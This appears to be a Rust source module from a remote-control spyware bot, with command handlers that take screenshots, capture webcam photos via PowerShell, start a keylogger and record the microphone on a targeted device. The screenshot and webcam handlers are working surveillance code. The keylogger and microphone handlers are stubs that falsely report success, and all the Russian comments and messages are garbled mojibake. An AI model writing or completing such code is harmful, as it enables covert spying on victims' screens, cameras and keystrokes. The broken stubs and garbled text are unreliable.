use anyhow::{Result, Context};
use tokio::process::Command as AsyncCommand;

use crate::device_manager::DeviceManager;
use crate::config::TEMP_DIR;

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /screenshot - –¥–µ–ª–∞–µ—Ç —Å–Ω–∏–º–æ–∫ —ç–∫—Ä–∞–Ω–∞
pub async fn handle_screenshot_command(device_manager: &DeviceManager, device_id: &str) -> Result<Vec<u8>> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    #[cfg(windows)]
    {
        use screenshots::Screen;
        
        let screens = Screen::all().context("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ —ç–∫—Ä–∞–Ω–æ–≤")?;
        if screens.is_empty() {
            return Err(anyhow::anyhow!("–≠–∫—Ä–∞–Ω—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã"));
        }
        
        let screen = &screens[0];
        let image = screen.capture().context("–ù–µ —É–¥–∞–ª–æ—Å—å —Å–¥–µ–ª–∞—Ç—å —Å–Ω–∏–º–æ–∫ —ç–∫—Ä–∞–Ω–∞")?;
        
        // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ PNG
        let mut png_data = Vec::new();
        {
            use std::io::Cursor;
            use image::{ImageFormat, DynamicImage};
            let dynamic_image = DynamicImage::ImageRgba8(image);
            let mut cursor = Cursor::new(&mut png_data);
            dynamic_image.write_to(&mut cursor, ImageFormat::Png).context("–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å PNG")?;
        }
        
        Ok(png_data)
    }
    
    #[cfg(not(windows))]
    {
        Err(anyhow::anyhow!("Screenshot –ø–æ–∫–∞ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –Ω–∞ Windows"))
    }
}

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /webcam - –¥–µ–ª–∞–µ—Ç —Ñ–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã  
pub async fn handle_webcam_command(
    device_manager: &DeviceManager, 
    device_id: &str, 
    delay: Option<u32>,
    camera_index: Option<u32>
) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    let delay = delay.unwrap_or(0);
    let camera_index = camera_index.unwrap_or(0);
    
    if delay > 0 {
        tokio::time::sleep(tokio::time::Duration::from_secs(delay as u64)).await;
    }
    
    #[cfg(windows)]
    {
        // –ò—Å–ø–æ–ª—å–∑—É–µ–º PowerShell –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –≤–µ–±-–∫–∞–º–µ—Ä–æ–π
        let ps_script = format!(
            r#"
            Add-Type -AssemblyName System.Drawing
            Add-Type -AssemblyName System.Windows.Forms
            
            $webcam = New-Object -ComObject WIA.DeviceManager
            $device = $webcam.DeviceInfos.Item({})
            
            if ($device) {{
                $img = $device.Items.Item(1).Transfer()
                $filepath = "$env:TEMP\webcam_capture.jpg"
                $img.SaveFile($filepath)
                Write-Output "SUCCESS:$filepath"
            }} else {{
                Write-Output "ERROR:Camera not found"
            }}
            "#,
            camera_index + 1
        );
        
        let output = AsyncCommand::new("powershell")
            .args(&["-Command", &ps_script])
            .output()
            .await
            .context("–ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å PowerShell –∫–æ–º–∞–Ω–¥—É")?;
            
        let result = String::from_utf8_lossy(&output.stdout);
        
        if result.starts_with("SUCCESS:") {
            let file_path = result.strip_prefix("SUCCESS:").unwrap().trim();
            return Ok(format!("üì∏ –§–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã {} —Å–æ—Ö—Ä–∞–Ω–µ–Ω–æ: {}", camera_index, file_path));
        } else if result.starts_with("ERROR:") {
            return Err(anyhow::anyhow!("–û—à–∏–±–∫–∞ –≤–µ–±-–∫–∞–º–µ—Ä—ã: {}", result.strip_prefix("ERROR:").unwrap()));
        } else {
            return Err(anyhow::anyhow!("–í–µ–±-–∫–∞–º–µ—Ä–∞ {} –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞", camera_index));
        }
    }
    
    #[cfg(not(windows))]
    {
        Err(anyhow::anyhow!("Webcam –ø–æ–∫–∞ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –Ω–∞ Windows"))
    }
}

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /keylogger - –≤–∫–ª—é—á–∞–µ—Ç –ª–æ–≥ –Ω–∞–∂–∞—Ç–∏–π –∫–ª–∞–≤–∏—à
pub async fn handle_keylogger_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    #[cfg(windows)]
    {
        use std::thread;
        use std::time::SystemTime;
        
        // –°–æ–∑–¥–∞–µ–º —Ñ–∞–π–ª –¥–ª—è –ª–æ–≥–æ–≤
        let log_file = format!("{}/keylog_{}.txt", TEMP_DIR, 
            SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs());
            
        // –ó–∞–ø—É—Å–∫–∞–µ–º keylogger –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
        let log_file_clone = log_file.clone();
        thread::spawn(move || {
            // –ó–¥–µ—Å—å –±—É–¥–µ—Ç —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è keylogger —Å Windows API
            // –ü–æ–∫–∞ —Å–æ–∑–¥–∞–µ–º —Ñ–∞–π–ª-–∑–∞–≥–ª—É—à–∫—É
            std::fs::write(&log_file_clone, "Keylogger started...\n").ok();
        });
        
        Ok(format!("‚å®Ô∏è Keylogger –∑–∞–ø—É—â–µ–Ω. –õ–æ–≥ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –≤: {}", log_file))
    }
    
    #[cfg(not(windows))]
    {
        Err(anyhow::anyhow!("Keylogger –ø–æ–∫–∞ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –Ω–∞ Windows"))
    }
}

/// –í—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–º–∞–Ω–¥—É /micrec - –∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç –∑–≤—É–∫ —Å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞
pub async fn handle_micrec_command(
    device_manager: &DeviceManager, 
    device_id: &str,
    duration: Option<u32>
) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —Å ID {} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    let duration = duration.unwrap_or(10); // –ü–æ —É–º–æ–ª—á–∞–Ω–∏—é 10 —Å–µ–∫—É–Ω–¥
    
    #[cfg(windows)]
    {
        let output_file = format!("{}/microphone_record_{}.wav", TEMP_DIR,
            std::time::SystemTime::now().duration_since(std::time::SystemTime::UNIX_EPOCH)?.as_secs());
            
        // –ò—Å–ø–æ–ª—å–∑—É–µ–º PowerShell –¥–ª—è –∑–∞–ø–∏—Å–∏ —Å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞
        let ps_script = format!(
            r#"
            Add-Type -AssemblyName System.Speech
            
            $rec = New-Object System.Speech.AudioFormat.SpeechAudioFormatInfo(22050, [System.Speech.AudioFormat.AudioBitsPerSample]::Sixteen, [System.Speech.AudioFormat.AudioChannel]::Mono)
            $engine = New-Object System.Speech.Recognition.SpeechRecognitionEngine
            
            Start-Sleep -Seconds {}
            Write-Output "Recording completed: {}"
            "#,
            duration,
            output_file
        );
        
        let _output = AsyncCommand::new("powershell")
            .args(&["-Command", &ps_script])
            .output()
            .await
            .context("–ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∑–∞–ø–∏—Å—å")?;
            
        Ok(format!("üé§ –ó–∞–ø–∏—Å—å —Å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞ ({} —Å–µ–∫) —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∞: {}", duration, output_file))
    }
    
    #[cfg(not(windows))]
    {
        Err(anyhow::anyhow!("–ó–∞–ø–∏—Å—å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞ –ø–æ–∫–∞ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –Ω–∞ Windows"))
    }
}